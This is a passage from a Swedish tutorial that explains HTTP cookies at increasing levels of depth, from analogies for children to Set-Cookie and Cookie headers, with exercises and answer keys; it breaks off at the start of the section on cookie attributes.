# Cookies – teori, användning & sårbarheter: Den kompletta guiden

## 📚 Innehållsförteckning

1. [Om denna guide](#-om-denna-guide)
2. [Nivå 1: Vad är en cookie? 👶](#nivå-1-vad-är-en-cookie-)
3. [Nivå 2: Cookies i vardagen 🧒](#nivå-2-cookies-i-vardagen-)
4. [Nivå 3: Hur cookies fungerar tekniskt 🎓](#nivå-3-hur-cookies-fungerar-tekniskt-)
5. [Nivå 4: Sårbarheter och best practices 🏛️](#nivå-4-sårbarheter-och-best-practices-)
6. [Nivå 5: Modern utveckling, standarder & avancerade tekniker 💼](#nivå-5-modern-utveckling-standarder--avancerade-tekniker-)
7. [Slutlig självutvärdering 🎓](#-slutlig-självutvärdering)
8. [Ordlista 📖](#-ordlista)
9. [Resurser för fördjupning 🔗](#-resurser-för-fördjupning)
10. [Vanliga frågor (FAQ) ❓](#-vanliga-frågor-faq)

---

## 🎯 Om denna guide

Välkommen till den kompletta guiden om **HTTP-cookies** – små men kraftfulla verktyg som gör webben mer användbar, men som också kan innebära säkerhetsrisker om de hanteras felaktigt.

### Vad är denna guide?

Denna guide tar dig på en resa från absolut nybörjare till expert inom området webbcookies. Du kommer att lära dig:

- **Vad cookies är** och varför de finns
- **Hur de fungerar** på teknisk nivå
- **Hur de används** i praktiken
- **Vilka säkerhetsrisker** som finns
- **Hur du skyddar dig** mot dessa risker
- **Moderna best practices** och standarder

### För vem?

Guiden är uppbyggd i **5 progressiva nivåer**:

1. **Nivå 1 (👶)**: För den som aldrig hört talas om cookies – förklaringar utan tekniska termer
2. **Nivå 2 (🧒)**: Grundläggande begrepp och vardaglig användning
3. **Nivå 3 (🎓)**: Teknisk förståelse på gymnasie-/högskolenivå
4. **Nivå 4 (🏛️)**: Djupdykning i säkerhetssårbarheter och försvar
5. **Nivå 5 (💼)**: Expertnivå med moderna standarder och arkitektur

Du kan läsa hela guiden från början till slut, eller hoppa direkt till den nivå som passar din kunskapsnivå.

### Hur använder jag guiden?

- **Läs progressivt**: Varje nivå bygger på den föregående
- **Gör övningarna**: Varje nivå innehåller praktiska övningar med facit
- **Ta pauser**: Varje nivå tar cirka 10-20 minuter att läsa
- **Testa dig själv**: Använd självutvärderingen i slutet för att se vad du lärt dig
- **Fördjupa dig**: Använd resurserna för att lära dig mer

### Vad menas med "cookies"?

I denna guide pratar vi om **HTTP-cookies** – små textfiler som webbplatser sparar i din webbläsare. Vi pratar INTE om bakverk, utan om en teknisk mekanism som är fundamental för hur moderna webbplatser fungerar.

### Estimerad lästid

- **Per nivå**: 10-20 minuter
- **Total**: 1.5-3 timmar (beroende på förkunskaper och hur djupt du vill gå)

Låt oss börja resan!

---

## Nivå 1: Vad är en cookie? 👶

### Introduktion

På denna första nivå ska du lära dig vad en "cookie" är på internet, utan krångliga ord. Du kommer att förstå varför hemsidor använder cookies och vad de gör för dig. Detta är grunden för allt annat vi ska lära oss senare!

### Kärnkoncept

#### 1. En cookie är som en liten påminnelselapp

Tänk dig att du går till din favoritleksaksaffär. Första gången du kommer dit berättar du för expediten att du heter Emma och att du älskar dockor. Nästa gång du kommer tillbaka säger expediten: "Hej Emma! Vill du se våra nya dockor?"

Hur kunde expediten komma ihåg dig? Jo, efter ditt första besök skrev expediten ner på en liten lapp: "Emma gillar dockor" och gav lappen till dig. Du stoppade lappen i fickan. Nästa gång du kom tillbaka tittade expediten på lappen och visste precis vem du var!

**En cookie på internet fungerar precis likadant!** Det är en liten "påminnelselapp" som en hemsida ger till din dator, så att hemsidan kan komma ihåg dig nästa gång.

#### 2. Varför vill hemsidor "komma ihåg" dig?

När du besöker en hemsida första gången känner hemsidan inte igen dig. Det är som att träffa någon ny. Men hemsidor vill kunna:

- **Känna igen dig** när du kommer tillbaka
- **Komma ihåg vad du gillar** (t.ex. vilken färg du vill ha på sidan)
- **Hålla koll på dina saker** (t.ex. vad du lagt i din kundvagn)
- **Veta att du är inloggad** så du inte behöver skriva ditt lösenord om och om igen

#### 3. Cookies finns i din dator

När en hemsida ger dig en cookie sparas den i din dator (eller surfplatta/telefon). Den ligger där och väntar tills du besöker samma hemsida igen. Då läser hemsidan lappen och kommer ihåg dig!

#### 4. Två sorters "kom-ihåg-lappar"

Det finns två sorters cookies, ungefär som det finns två sorters lappar:

**Korttidslappar (som du slänger snart):**
Tänk dig att du är på ett kalas. Du får ett armband som visar att du får vara med. Men när kalaset är slut tar du av armbandet och slänger det.

Dessa kallas **sessionskakor** – de försvinner när du stänger ner hemsidan.

**Långtidslappar (som du sparar länge):**
Tänk dig att du får ett medlemskort till biblioteket. Det ligger kvar i din plånbok i månader eller år, så att biblioteket alltid känner igen dig.

Dessa kallas **långvariga kakor** – de stannar kvar i din dator tills de blir för gamla.

#### 5. Cookies är inte farliga – men man ska vara försiktig

En cookie är bara en liten textlapp med information. Den kan inte:
- Förstöra din dator
- Ge dig virus
- Stjäla dina leksaker

Men precis som du inte vill att vem som helst ska läsa dina hemliga anteckningar, så är det viktigt att cookies hanteras rätt. Snälla hemsidor använder cookies för att hjälpa dig. Men det finns också hemsidor som vill spionera på vad du gör – och det ska vi lära oss mer om senare!

### Exempel

#### Exempel 1: Ditt favoritspel kommer ihåg dig

Du spelar ett spel på internet där du samlar stjärnor. Du har samlat 47 stjärnor! Sedan stänger du av datorn och går och leker.

Nästa dag öppnar du spelet igen. PANG! Du har fortfarande 47 stjärnor! Hur kunde spelet komma ihåg det?

**Svar:** Spelet gav din dator en cookie som säger: "Den här spelaren har 47 stjärnor." När du kom tillbaka läste spelet cookien och visste precis hur många stjärnor du hade!

#### Exempel 2: Du väljer färg på en hemsida

Du besöker en teckningssida där du kan välja om bakgrunden ska vara rosa eller blå. Du väljer rosa för det är din favoritfärg!

Nästa gång du besöker sidan är den rosa direkt, utan att du behöver välja igen!

**Svar:** Sidan sparade en cookie som säger: "Den här personen gillar rosa bakgrund." När du kom tillbaka läste sidan cookien och gjorde bakgrunden rosa automatiskt!

#### Exempel 3: Jämförelse – med och utan cookies

**UTAN cookies (som att ha dåligt minne):**

- Du loggar in på en hemsida
- Du tittar på tre sidor
- Vid varje ny sida: "Vem är du? Logga in igen!"
- Du måste skriva ditt lösenord OM och OM igen
- Din kundvagn glömmer vad du lagt i den

**MED cookies (som att ha bra minne):**

- Du loggar in på en hemsida EN gång
- Du kan titta på hur många sidor som helst
- Hemsidan vet hela tiden vem du är
- Du behöver inte logga in igen
- Din kundvagn kommer ihåg alla dina saker

Vilket låter bättre? Med cookies, förstås!

### 💡 Pro Tips

**Tips 1: Cookies är inte magiska**
Cookies kan inte läsa tankar eller veta saker som du inte berättat för hemsidan. Om du aldrig sagt till hemsidan vad du heter, kan cookien inte heller veta det!

**Tips 2: Olika hemsidor har olika cookies**
Cookies från din favoritspelsida vet ingenting om cookies från din skolhemsida. Det är som att ha olika påminnelselappar för olika ställen – de pratar inte med varandra!

**Tips 3: Du kan kasta cookies**
Precis som du kan slänga lappar i papperskorgen kan du ta bort cookies från din dator. Då "glömmer" hemsidorna dig och du börjar om från början nästa gång du besöker dem.

### ✏️ Övningar

#### Övning 1: Cookie eller inte cookie?

Läs varje scenario och gissa om en cookie används:

**A)** Sara loggar in på sitt bibliotekskonto. Hon stänger hemsidan och öppnar den igen 5 minuter senare. Hon är fortfarande inloggad!

**B)** Johan tittar på vädret på en hemsida. Hemsidan visar "23 grader i Stockholm" – samma temperatur för alla som besöker sidan.

**C)** Lisa lägger en bok i sin webbkundvagn. Hon stänger datorn. Nästa dag öppnar hon hemsidan igen och boken finns fortfarande i kundvagnen!

**D)** Mamma söker efter "barnböcker" på Google. Pappa använder samma dator senare och söker efter "bildelar". Google visar olika förslag för mamma och pappa.

<details>
<summary>📖 Visa facit</summary>

**A) Cookie används!** ✓
Hemsidan gav Sara en cookie när hon loggade in. Cookien säger "Sara är inloggad" så hon slipper logga in igen.

**B) Ingen cookie behövs!** ✗
Vädret är samma för alla. Hemsidan behöver inte komma ihåg något speciellt om just den här besökaren.

**C) Cookie används!** ✓
När Lisa lade boken i kundvagnen sparades det i en cookie. Nästa dag läste hemsidan cookien och visste att boken skulle vara där!

**D) Cookie används!** ✓
Google använder cookies för att komma ihåg vad olika personer sökt efter. Mammas cookie säger en sak, pappas cookie säger något annat.

</details>

#### Övning 2: Vad kommer hemsidan ihåg?

Matcha vad hemsidan kan komma ihåg med hjälp av en cookie:

1. Vilken färg du valt på bakgrunden
2. Vad klockan är just nu
3. Att du är inloggad
4. Hur många besökare hemsidan har totalt
5. Vilka saker du lagt i din kundvagn
6. Ditt favoritdjur som du valt

<details>
<summary>📖 Visa facit</summary>

**Kommer ihåg med cookie:**
- 1. Vilken färg du valt på bakgrunden ✓
- 3. Att du är inloggad ✓
- 5. Vilka saker du lagt i din kundvagn ✓
- 6. Ditt favoritdjur som du valt ✓

**Kommer INTE ihåg med cookie:**
- 2. Vad klockan är just nu ✗ (Klockan ändras hela tiden och är samma för alla!)
- 4. Hur många besökare hemsidan har totalt ✗ (Detta räknas på servern, inte i din cookie!)

**Förklaring:** Cookies kommer ihåg saker som är speciella för JUST DIG. Saker som är samma för alla (som klockan) behöver inte sparas i en cookie.

</details>

#### Övning 3: Kort eller lång cookie?

Bestäm om hemsidan använder en kort cookie (som försvinner snart) eller lång cookie (som stannar länge):

**A)** Ett spel som kommer ihåg ditt namn i flera månader

**B)** En hemsida där du loggar in på banken – du loggas ut automatiskt efter 10 minuter

**C)** En nyhetshemsida som kommer ihåg att du valt "stor text" och det stannar i flera veckor

<details>
<summary>📖 Visa facit</summary>

**A) Lång cookie!**
Om spelet kommer ihåg ditt namn i flera månader måste cookien ligga kvar länge i din dator.

**B) Kort cookie!**
Banken vill att du ska loggas ut snabbt för säkerhet. Cookien försvinner efter en kort stund.

**C) Lång cookie!**
Dina inställningar (som textstorlek) sparas länge så du slipper välja om varje gång.

</details>

### 📝 Sammanfattning

**Viktigaste lärdomarna från Nivå 1:**

- En **cookie** är som en liten påminnelselapp som en hemsida ger till din dator
- Cookies hjälper hemsidor att **komma ihåg** vem du är och vad du gillar
- Cookies sparas **i din dator** (eller telefon/surfplatta)
- Det finns **korta cookies** (som försvinner snabbt) och **långa cookies** (som stannar kvar)
- Cookies används för att du ska kunna vara **inloggad**, ha saker i din **kundvagn**, och få **personliga inställningar**
- Cookies är **inte farliga** i sig själva, men vi måste förstå hur de fungerar

**Nya ord du lärt dig:**

- **Cookie** – En liten påminnelselapp från en hemsida
- **Komma ihåg** – Vad cookies hjälper hemsidor att göra
- **Kort cookie (session)** – Försvinner snabbt
- **Lång cookie** – Stannar kvar länge

**Nästa steg:**

Nu när du förstår VADA en cookie är, är det dags att lära sig mer om HUR cookies fungerar i vardagen! I nästa nivå ska vi prata om webbläsare, servrar, och olika sätt som cookies används på riktiga hemsidor.

---

## Nivå 2: Cookies i vardagen 🧒

### Introduktion

Nu när du vet vad en cookie är, ska vi lära oss mer om hur cookies används i din vardag! Du kommer att förstå skillnaden mellan olika typer av cookies, vad de gör, och varför du ibland ser meddelanden om cookies när du besöker hemsidor. Detta är viktigt för att förstå hur internet fungerar och hur du kan skydda din integritet.

### Kärnkoncept

#### 1. Webbläsare och Webbserver – två viktiga spelare

För att förstå cookies måste vi först förstå två viktiga delar av internet:

**Webbläsaren** är programmet du använder för att surfa på internet. Det kan vara:
- Chrome (Googles webbläsare)
- Safari (Apples webbläsare)
- Firefox (Mozillas webbläsare)
- Edge (Microsofts webbläsare)

Din webbläsare är som din ryggsäck – den bär med sig alla cookies när du surfar!

**Webbservern** är en kraftfull dator någonstans i världen som äger hemsidan du besöker. När du går in på www.spel.se så pratar din webbläsare med spel.se:s server och säger "Hej! Jag vill se din hemsida!". Servern skickar tillbaka hemsidan OCH cookies.

**Så här fungerar det:**
```
DIN DATOR                                SERVERN
(Webbläsare)                         (Hemsidans dator)
     |                                       |
     |----"Hej! Jag vill se hemsidan"------>|
     |                                       |
     |<---"Här är sidan + en cookie!"-------|
     |                                       |
(Sparar cookie)                              |
     |                                       |
     |----"Hej igen! (+ min cookie)-------->|
     |                                       |
     |<---"Välkommen tillbaka!"-------------|
```

#### 2. Sessionscookies vs Permanenta cookies

Vi pratade kort om detta i Nivå 1, men nu går vi djupare!

**Sessionscookies (tillfälliga):**
- Försvinner när du **stänger webbläsaren**
- Sparas bara i datorns minne, inte på hårddisken
- Perfekt för saker som bara behövs en kort stund
- Exempel: Hålla dig inloggad medan du surfar på banken

**Permanenta cookies (långvariga):**
- Stannar kvar även efter att du stängt webbläsaren
- Sparas på din hårddisk i en speciell mapp
- Har ett **utgångsdatum** – försvinner när den tiden är slut
- Exempel: "Kom ihåg mig"-funktionen på din favoritsida

**Skillnaden i praktiken:**

| Scenario | Sessionscookie | Permanent cookie |
|----------|---------------|------------------|
| Du loggar in på banken | ✓ Används tills du stänger webbläsaren | ✗ För osäkert! |
| Du väljer "Kom ihåg mig" på ett spel | ✗ Skulle glömma dig direkt | ✓ Kommer ihåg dig i veckor |
| Du handlar online | ✓ Kundvagnen under besöket | ✓ Kan även spara varan till nästa dag |

#### 3. Var sparas cookies egentligen?

Cookies sparas **i din webbläsare**, i en speciell mapp på din dator. Varje webbläsare har sin egen "cookie-burk":

- Chrome sparar sina cookies på ett ställe
- Firefox sparar sina cookies på ett annat ställe
- Safari har sina egna cookies

Det betyder att om du loggar in på spel.se i Chrome, är du INTE inloggad om du öppnar Firefox! De har olika cookie-burkar.

#### 4. Första parts-cookies vs Tredje parts-cookies

Nu blir det lite mer avancerat – men viktigt att förstå!

**Första parts-cookies** (egna cookies):
- Skapas av hemsidan du besöker
- Exempel: Du är på spel.se och spel.se ger dig en cookie
- Detta är "OK" – det är som att butiken du besöker ger dig ett medlemskort

**Tredje parts-cookies** (andras cookies):
- Skapas av NÅGON ANNAN än hemsidan du besöker
- Exempel: Du är på spel.se men får en cookie från reklam-företag.se
- Detta används ofta för **spårning och reklam**

**Enkel förklaring:**

Tänk dig att du går till biblioteket (första parts). Biblioteket ger dig ett lånekort (första parts-cookie) – det är bra!

Men medan du är där tar en person från en affär ett foto på dig och skriver upp vad du läser (tredje parts-cookie). Sedan följer denna person dig överallt och skriver upp vad du gör. Lite läskigt, eller hur?

**Viktigt år 2024-2025:**
Många webbläsare (som Safari och Firefox) blockerar nu tredje parts-cookies automatiskt! Google Chrome planerade att göra samma sak men har beslutat att istället låta användarna välja själva. Detta är för att skydda din integritet!

#### 5. Olika användningsområden för cookies

Här är de vanligaste sätten cookies används:

**Inloggning och konto:**
- Hålla dig inloggad medan du surfar
- "Kom ihåg mig"-funktioner
- Veta vem du är utan att du behöver logga in varje sida

**Inställningar och preferenser:**
- Komma ihåg ditt språkval (svenska, engelska, etc.)
- Spara tema/färg på hemsidan
- Komma ihåg textstorlek
- Valuta (kronor, dollar, euro)

**E-handel och shopping:**
- Hålla koll på din kundvagn
- Spara saker du tittat på
- Komma ihåg leveransadress

**Prestanda och funktionalitet:**
- Göra hemsidan snabbare
- Komma ihåg vilka sidor du besökt (för "bakåt"-knappen)
- Balansera belastning mellan flera servrar

**Spårning och reklam (tredje parts):**
- Se vilka sidor du besöker
- Anpassa reklam efter dina intressen
- Mäta hur många som besöker en sida

#### 6. Varför ser jag "cookie-meddelanden" överallt?

Har du märkt att nästan varje hemsida visar en ruta som säger "Vi använder cookies"? Det finns en anledning!

I Europa (och många andra ställen) finns en lag som heter **GDPR** (General Data Protection Regulation). Den säger att hemsidor MÅSTE:
- Berätta vilka cookies de använder
- Fråga om lov innan de använder vissa cookies
- Låta dig välja vilka cookies du vill ha

**Varför?** För att skydda din integritet! Du har rätt att veta vem som samlar information om dig.

**Olika typer av cookies kräver olika tillstånd:**
- **Nödvändiga cookies** (för att hemsidan ska fungera): Behöver INTE ditt godkännande
- **Preferens-cookies** (komma ihåg dina val): Behöver oftast godkännande
- **Spårnings-cookies** (marknadsföring): Behöver ALLTID ditt godkännande

### Exempel

#### Exempel 1: Sara shoppar online

**Scenario:**
Sara besöker en nätbutik för att köpa en bok. Hon lägger boken i kundvagnen men bestämmer sig för att tänka över det. Hon stänger webbläsaren och går och äter lunch. En timme senare öppnar hon hemsidan igen – boken finns fortfarande i kundvagnen!

**Vad hände?**
1. När Sara la boken i kundvagnen skapade nätbutiken en **permanent cookie** som sa: "Bok123 finns i Saras kundvagn"
2. Cookien sparades i Saras webbläsare med ett utgångsdatum (kanske 30 dagar)
3. När Sara öppnade hemsidan igen läste servern cookien och visste: "Aha! Sara har en bok i sin kundvagn!"

**Typ av cookie:** Permanent (första parts)

#### Exempel 2: Johan och banken

**Scenario:**
Johan loggar in på sin internetbank. Han kollar sitt saldo och gör en betalning. Han stänger webbläsarfönstret. 10 minuter senare öppnar han banken igen – han är INTE inloggad längre!

**Vad hände?**
1. När Johan loggade in skapade banken en **sessionscookie** som sa: "Johan är inloggad"
2. När Johan stängde webbläsaren försvann sessionscookien (för säkerhet!)
3. Nästa gång Johan öppnade banken fanns ingen cookie, så han måste logga in igen

**Varför?**
Banken använder sessionscookies av **säkerhetsskäl**. Om någon annan skulle komma åt din dator efter dig, skulle de inte kunna komma in på din bank!

**Typ av cookie:** Sessionscookie (första parts)

#### Exempel 3: Lisa och den läskiga reklamen

**Scenario:**
Lisa tittar på hundar på en djuraffärs hemsida. Hon stänger sidan och går in på en nyhetssida. Plötsligt ser hon reklam för... hundmat och hundleksaker! Hur visste nyhetssidan att hon gillar hundar?

**Vad hände?**
1. På djuraffärens hemsida fanns det reklam från "ReklamFöretag AB"
2. ReklamFöretag AB skapade en **tredje parts-cookie** i Lisas webbläsare som sa: "Den här personen tittar på hundar"
3. På nyhetssidan fanns reklam från samma ReklamFöretag AB
4. ReklamFöretag AB läste sin cookie och visste: "Aha! Denna person gillar hundar. Visa hundreklam!"

**Typ av cookie:** Permanent tredje parts (för spårning)

**Obs!** Många webbläsare blockerar nu denna typ av cookies automatiskt!

#### Exempel 4: Jämförelse – med och utan cookies

**Webbshop UTAN cookies:**
1. Du lägger en bok i kundvagnen
2. Du klickar vidare till nästa sida
3. Kundvagnen är tom – butiken glömde boken!
4. Du måste börja om från början...
5. Du kan aldrig handla – det är omöjligt!

**Webbshop MED cookies:**
1. Du lägger en bok i kundvagnen → Cookie: "Bok i kundvagn"
2. Du lägger till en penna → Cookie uppdateras: "Bok + penna i kundvagn"
3. Du går till kassan → Butiken läser cookien: "Aha! Bok + penna"
4. Du kan betala → Allt fungerar!

### 💡 Pro Tips

**Pro Tip 1: Du kan se alla dina cookies**
Du kan faktiskt öppna din webbläsare och se ALLA cookies som sparats! I Chrome: Inställningar → Integritet och säkerhet → Cookies. Där kan du se vilka hemsidor som gett dig cookies och vad de heter. Prova!

**Pro Tip 2: "Inkognitoläge" tar inte bort gamla cookies**
Många tror att inkognitoläge tar bort alla cookies. Det stämmer INTE! Inkognitoläge:
- Tar INTE bort gamla cookies
- Skapar nya sessionscookies under besöket
- Raderar de NYA cookies när du stänger inkognitofönstret
- Gamla cookies finns kvar!

**Pro Tip 3: Rensa cookies för att "börja om"**
Om en hemsida beter sig konstigt, prova att rensa cookies för den sidan! Det är som att "börja om från början". Ofta fixar det problem!

### ✏️ Övningar

#### Övning 1: Identifiera cookietyp

För varje scenario, bestäm om det är en **sessionscookie** eller **permanent cookie**:

**A)** En nyhetshemsida kommer ihåg att du vill ha artiklar på stor textstorlek. Det fungerar även nästa vecka.

**B)** Du loggar in på skolans hemsida. När du stänger webbläsaren och öppnar den igen måste du logga in på nytt.

**C)** Ett spel kommer ihåg din högsta poäng i flera månader.

**D)** En bankapp loggar ut dig automatiskt efter 15 minuter av inaktivitet.

**E)** En hemsida kommer ihåg att du godkänt deras cookie-policy och visar inte meddelandet igen på länge.

<details>
<summary>📖 Visa facit</summary>

**A) Permanent cookie** ✓
Inställningar som sparas länge använder permanenta cookies med utgångsdatum i framtiden.

**B) Sessionscookie** ✓
Cookies som försvinner när du stänger webbläsaren är sessionscookies. Detta är vanligt för säkra tjänster som skolor och banker.

**C) Permanent cookie** ✓
Något som kommer ihåg i "flera månader" måste vara en permanent cookie med långt utgångsdatum.

**D) Sessionscookie** ✓
Även om det är 15 minuter är detta en säkerhetsåtgärd med sessionscookie som har kort livstid.

**E) Permanent cookie** ✓
Cookie-godkännanden sparas ofta i flera månader eller ett år, så detta är en permanent cookie.

</details>

#### Övning 2: Första parts eller tredje parts?

Bestäm om följande är **första parts-cookies** eller **tredje parts-cookies**:

**A)** Du är på fotboll.se. Sidan ger dig en cookie för att komma ihåg ditt favoritlag.

**B)** Du är på nyheter.se. En annons från google-ads.com sätter en cookie för att följa vilka artiklar du läser.

**C)** Du är på bibliotek.se. Sidan sparar en cookie när du loggar in.

**D)** Du är på recept.se. En video från youtube.com spelar upp och YouTube sparar en cookie.

**E)** Du är på skola.se. Sidan använder en cookie för att komma ihåg att du valt mörkt tema.

<details>
<summary>📖 Visa facit</summary>

**A) Första parts-cookie** ✓
Du är på fotboll.se och fotboll.se ger dig cookien. Det är deras egen cookie!

**B) Tredje parts-cookie** ✓
Du är på nyheter.se men google-ads.com (någon annan!) ger dig cookien. Detta är tredje parts och används för spårning.

**C) Första parts-cookie** ✓
Du är på bibliotek.se och bibliotek.se ger dig cookien för inloggning. Första parts!

**D) Tredje parts-cookie** ✓
Du är på recept.se men youtube.com (en annan tjänst) ger dig cookien. Tredje parts!

**E) Första parts-cookie** ✓
Du är på skola.se och skola.se sparar dina inställningar. Första parts!

**Tumregel:** Om cookien kommer från samma hemsida som du besöker = första parts. Om den kommer från någon annan = tredje parts.

</details>

#### Övning 3: Vad händer om...?

Besvara följande frågor:

**A)** Du använder Chrome och loggar in på spel.se. Sedan öppnar du Firefox. Är du fortfarande inloggad på spel.se i Firefox?

**B)** Du besöker en hemsida och ser meddelandet "Vi använder cookies". Du klickar "Acceptera alla". Vad händer?

**C)** Du raderar alla cookies från din webbläsare. Vad kommer att hända nästa gång du besöker dina favoritwebbplatser?

<details>
<summary>📖 Visa facit</summary>

**A) NEJ, du är INTE inloggad i Firefox!** ✗
Chrome och Firefox har separata cookie-lager. Cookies som sparas i Chrome finns inte i Firefox! Det är som att ha två olika fickor – lappar i den ena fickan finns inte i den andra.

**B) Hemsidan får lov att spara olika cookies**
När du klickar "Acceptera alla" ger du hemsidan tillåtelse att:
- Spara nödvändiga cookies (för att sidan ska fungera)
- Spara preferens-cookies (dina inställningar)
- Spara tracking-cookies (för reklam och analys)

Hemsidan kommer ihåg ditt val med en cookie (haha, ja – de använder en cookie för att komma ihåg att du accepterat cookies!).

**C) Allt "glöms bort"**
När du raderar cookies händer följande:
- Du loggas ut från alla hemsidor
- Alla inställningar (språk, tema, etc.) försvinner
- Kundvagnar töms
- Hemsidor visar cookie-meddelandet igen
- Det är som att besöka alla hemsidor för första gången!

</details>

#### Övning 4: Matcha användning med cookietyp

Dra linjer mellan användningen och rätt kombination:

| Användning | Session/Permanent | Första/Tredje parts |
|-----------|-------------------|---------------------|
| A) Bankinloggning | ? | ? |
| B) "Kom ihåg mig" på spel | ? | ? |
| C) Reklamföretag följer dig | ? | ? |
| D) Språkval som sparas länge | ? | ? |
| E) Tillfällig kundvagn | ? | ? |

<details>
<summary>📖 Visa facit</summary>

| Användning | Session/Permanent | Första/Tredje parts |
|-----------|-------------------|---------------------|
| A) Bankinloggning | **Session** | **Första parts** |
| B) "Kom ihåg mig" på spel | **Permanent** | **Första parts** |
| C) Reklamföretag följer dig | **Permanent** | **Tredje parts** |
| D) Språkval som sparas länge | **Permanent** | **Första parts** |
| E) Tillfällig kundvagn | **Session** | **Första parts** |

**Förklaring:**
- **Bankinloggning**: Säkerhetskritiskt → Session, och från banken själv → Första parts
- **"Kom ihåg mig"**: Måste sparas länge → Permanent, från spelet → Första parts
- **Reklamföretag**: Spårning mellan sidor → Permanent, från annat företag → Tredje parts
- **Språkval**: Inställning som sparas → Permanent, från sidan själv → Första parts
- **Tillfällig kundvagn**: Bara under besöket → Session, från butiken → Första parts

</details>

#### Övning 5: Cookie-meddelande – vad ska du göra?

Du besöker en ny hemsida och ser detta cookie-meddelande:

```
🍪 Vi använder cookies
Denna webbplats använder:
□ Nödvändiga cookies (krävs för funktionalitet)
□ Preferens-cookies (dina inställningar)
□ Marknadsföringscookies (personanpassad reklam)

[Acceptera alla] [Acceptera valda] [Avvisa alla]
```

**Frågor:**
1. Vilka cookies kan hemsidan använda UTAN ditt godkännande?
2. Om du bara vill att hemsidan ska fungera men inte vilja bli spårad, vad väljer du?
3. Vad händer om du klickar "Avvisa alla" – kan hemsidan fortfarande fungera?

<details>
<summary>📖 Visa facit</summary>

**1. Nödvändiga cookies**
Hemsidan får alltid använda "nödvändiga cookies" utan att fråga. Dessa är kritiska för att hemsidan ska fungera (t.ex. sessions-ID, säkerhetscookies). Allt annat kräver ditt godkännande enligt GDPR.

**2. Acceptera endast "Nödvändiga cookies"**
Bocka bara i "Nödvändiga cookies" och klicka "Acceptera valda". Då får du en fungerande hemsida utan tracking eller reklam-cookies. Dina inställningar sparas inte heller, men det är priset för mer integritet.

**3. Ja, hemsidan fungerar fortfarande!**
Om du klickar "Avvisa alla" blockeras preferens- och marknadsföringscookies, men nödvändiga cookies tillåts ändå. Hemsidan fungerar, men:
- Du måste välja språk varje gång
- Inställningar sparas inte
- Du ser generisk reklam (inte anpassad)
- Cookie-meddelandet kan visas igen

</details>

### 📝 Sammanfattning

**Viktigaste lärdomarna från Nivå 2:**

- **Webbläsaren** lagrar cookies lokalt, och **servern** skapar dem
- **Sessionscookies** försvinner när du stänger webbläsaren; **permanenta cookies** har ett utgångsdatum och stannar kvar längre
- **Första parts-cookies** kommer från hemsidan du besöker (OK); **tredje parts-cookies** kommer från andra företag (ofta för spårning)
- Cookies används för: **inloggning, inställningar, kundvagnar, prestanda och reklam/spårning**
- **GDPR och cookie-lagar** kräver att hemsidor frågar om lov innan de använder icke-nödvändiga cookies
- Olika webbläsare har separata cookie-lager
- Moderna webbläsare (Safari, Firefox) blockerar tredje parts-cookies automatiskt; Chrome låter användare välja

**Nya ord du lärt dig:**

- **Webbläsare** – Program för att surfa (Chrome, Firefox, Safari, Edge)
- **Webbserver** – Dator som äger och driver hemsidan
- **Sessionscookie** – Tillfällig cookie som försvinner när webbläsaren stängs
- **Permanent cookie** – Cookie med utgångsdatum som stannar kvar längre
- **Första parts-cookie** – Cookie från hemsidan du besöker
- **Tredje parts-cookie** – Cookie från någon annan (ofta reklam)
- **GDPR** – Europeisk lag som skyddar din integritet online
- **Utgångsdatum** – När en cookie automatiskt raderas

**Nästa steg:**

Nu när du förstår olika typer av cookies och hur de används i vardagen, är det dags att gå djupare! I nästa nivå ska vi lära oss exakt HUR cookies fungerar tekniskt – vad händer bakom kulisserna när en server skapar en cookie? Vad är HTTP? Vilka attribut har cookies? Vi går in på gymnasienivå!

---

## Nivå 3: Hur cookies fungerar tekniskt 🎓

### Introduktion

Nu tar vi steget från vardaglig förståelse till teknisk kunskap! Du kommer att lära dig exakt hur cookies fungerar på HTTP-protokollnivå, vilka attribut de har, och hur webbläsare och servrar kommunicerar. Detta är viktigt för alla som vill förstå webbutveckling, säkerhet, eller bara vill ha en djupare förståelse för hur internet fungerar. Efter denna nivå kommer du kunna läsa och förstå riktiga HTTP-headers och cookie-konfigurationer.

### Kärnkoncept

#### 1. HTTP – Webbens språk

**HTTP** (HyperText Transfer Protocol) är protokollet som webbläsare och servrar använder för att prata med varandra. Tänk på det som ett gemensamt språk med fasta regler.

**Viktigt att förstå om HTTP:**
- HTTP är **statslöst** (stateless) – det betyder att servern inte kommer ihåg tidigare förfrågningar
- Varje HTTP-förfrågan är fristående och oberoende
- Cookies är ett sätt att kringgå denna "glömska" och skapa tillstånd (state)

**HTTP-kommunikation består av två delar:**

**1. HTTP Request (förfrågan)** – från klient till server
```
GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0
Cookie: session_id=abc123; theme=dark
```

**2. HTTP Response (svar)** – från server till klient
```
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session_id=abc123; Path=/; HttpOnly
Set-Cookie: theme=dark; Max-Age=2592000

<html>...</html>
```

**Observera:** Cookies skickas via speciella **headers** (rubriker) i HTTP-meddelanden!

#### 2. Set-Cookie – Servern skapar cookies

När servern vill skapa en cookie använder den **`Set-Cookie`**-headern i sitt HTTP-svar.

**Grundläggande syntax:**
```
Set-Cookie: name=value
```

**Exempel:**
```
Set-Cookie: user_id=12345
Set-Cookie: language=sv
Set-Cookie: session_token=xyz789abc
```

**Viktigt:**
- Varje cookie kräver sin egen `Set-Cookie`-header
- Namnet och värdet är enkla textsträngar
- Cookien sparas automatiskt av webbläsaren

**Flöde:**
```
1. Klient besöker example.com
2. Server svarar med: Set-Cookie: user_id=12345
3. Webbläsaren sparar: user_id=12345 för example.com
4. Vid nästa besök skickar webbläsaren tillbaka denna cookie
```

#### 3. Cookie – Webbläsaren skickar tillbaka cookies

När webbläsaren gör en ny förfrågan till samma server skickar den automatiskt alla relevanta cookies via **`Cookie`**-headern.

**Syntax:**
```
Cookie: name1=value1; name2=value2; name3=value3
```

**Exempel:**
```
Cookie: user_id=12345; language=sv; session_token=xyz789abc
```

**Observera:**
- ALLA cookies skickas i EN header
- Separerade med semikolon och mellanslag (`;` )
- Inga attribut skickas – bara namn och värde!
- Webbläsaren bestämmer automatiskt vilka cookies som är relevanta

**Viktigt:** Attribut som `HttpOnly`, `Secure`, `Path` etc. används av webbläsaren för att avgöra VILKA cookies som ska skickas, men attributen själva skickas ALDRIG tillbaka till servern.

#### 4. Cookie-attribut – Kontrollera cookiens beteende

Cookies har flera attribut som styr hur de fungerar. Dessa läggs till i `Set-Cookie`-headern.

##### 4.1 Expires och Max-Age – Livslängd

